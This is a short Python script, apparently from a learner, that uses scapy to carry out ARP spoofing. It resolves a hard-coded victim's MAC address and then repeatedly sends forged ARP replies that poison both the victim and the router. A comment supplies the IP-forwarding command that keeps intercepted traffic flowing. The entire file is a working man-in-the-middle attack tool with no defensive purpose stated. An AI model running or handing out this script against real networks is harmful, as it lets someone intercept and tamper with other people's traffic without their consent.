#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip) :
	arp_request = scapy.ARP(pdst = ip) # frame 1
	
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # frame 2

	# combining both frames by using '/' and make them a packet
	arp_request_broadcast = broadcast/arp_request

	# send and receive packets
	answered_list= scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # use zero to print the first element of list means answered list
	
	return answered_list[0][1].hwsrc

	

def spoof(target_ip, spoof_ip) :

	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
	scapy.send(packet, verbose = False)

#using loops for sendiong continiously packets to the machines

sent_packets_count = 0


try : 
	while True:
		spoof("192.168.5.212", "192.168.5.1") 
		# tell the victim(taregeted machine) that i am router

		spoof("192.168.5.1", "192.168.5.212") 
		# tell the router that i am victim(taregeted machine) 

		sent_packets_count = sent_packets_count + 2
		print("\r[+] Packets Sent: " + str(sent_packets_count), end="")

		time.sleep(2)
		#this will send two packets and then sleep for two seconds

	#for ip forwarding right the command : echo 1 > /proc/sys/net/ipv4/ip_forward
except KeyboardInterrupt :
	print("[+] Detected CTRL + C ...... Quitting. ")